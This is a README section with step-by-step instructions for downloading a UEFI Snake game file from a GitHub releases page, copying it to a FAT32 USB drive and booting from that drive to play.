## 🛠️ Installation Instructions

Follow these steps to download and run SnakePkg:

### Step 1: Visit the Releases Page

Go to the [Releases page](https://github.com/henrytung88/SnakePkg/releases) to access the latest version of SnakePkg. You'll find all available versions listed there.

### Step 2: Download the Application

Look for the latest version. Click on the download link for the application file. The file is usually titled something like `SnakePkg.efi`. Save it to a folder you can easily find, like your Downloads folder.

### Step 3: Prepare a USB Drive

You need a USB drive to run the game since it works with UEFI firmware. Make sure the USB drive is formatted as FAT32. To do this:

1. **Windows**:
   - Insert the USB drive.
   - Open "This PC" (or "My Computer").
   - Right-click the USB drive and select "Format".
   - Choose FAT32 as the file system.
   - Click "Start".

2. **Mac**:
   - Insert the USB drive.
   - Open "Disk Utility".
   - Select the USB drive and click "Erase".
   - Choose MS-DOS (FAT) as the format.
   - Click "Erase".

### Step 4: Copy the Application to USB

Once your USB is ready, copy the downloaded `SnakePkg.efi` file to the root directory of the USB drive. Ensure it is not in a folder.

### Step 5: Boot from USB

Restart your computer and enter the UEFI setup. The key to enter setup varies by manufacturer, but is often one of the following: F2, F10, DELETE, or ESC. Look for a prompt during the startup screen for the correct key.

1. In the UEFI setup, find the Boot menu.
2. Change the boot order to select your USB drive as the first boot device.
3. Save the changes and exit.

### Step 6: Start Playing

After your computer restarts, it should boot from the USB drive, and the Snake game will launch. Use your keyboard to navigate. Enjoy the classic Snake experience!
